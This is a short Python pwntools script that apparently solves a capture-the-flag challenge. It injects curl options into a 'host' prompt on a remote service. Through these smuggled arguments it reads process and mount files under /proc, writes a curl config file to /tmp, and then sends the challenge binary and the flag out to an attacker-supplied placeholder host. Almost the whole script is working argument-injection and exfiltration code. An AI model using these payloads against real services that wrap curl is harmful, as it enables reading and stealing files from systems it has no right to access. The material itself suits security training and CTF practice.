#!/usr/bin/env python3

from pwn import *

io = remote("challs.scriptsorcerers.xyz", 10396)

user = "/home/crazy_user_for_challenge"
YOUR_HOST = "YOUR_HOST"

'''
DISCLAIMER: I DID ALL BY HANDS, THIS SOLVE IS AN EXAMPLE OF THE PROCESS
'''

# Find the latest allocated PID
io.sendlineafter(b"enter host: ", f"{YOUR_HOST} -d @/proc/sys/kernel/ns_last_pid".encode())

# Check /proc/<pid>/cmdline while walking backwards
pid = "<PID>"
io.sendlineafter(b"enter host: ", f"{YOUR_HOST} -d @/proc/{pid}/cmdline".encode())

# Once the challenge PID is found, read the mount table
io.sendlineafter(b"enter host: ", f"{YOUR_HOST} -d @/proc/{pid}/mounts".encode())

# Create the curl config file containing the binary path
io.sendlineafter(b"enter host: ", f"{YOUR_HOST} -o /tmp/x".encode())

# Check that the config file contains the expected content
io.sendlineafter(b"enter host: ", f"{YOUR_HOST} -d @/tmp/x".encode())

# Load the config file and upload the binary
io.sendlineafter(b"enter host: ", f"{YOUR_HOST} -K /tmp/x".encode())

# Repeat the process for the flag
io.sendlineafter(b"enter host: ", f"{YOUR_HOST} -o /tmp/x".encode())
io.sendlineafter(b"enter host: ", f"{YOUR_HOST} -K /tmp/x".encode())

io.interactive()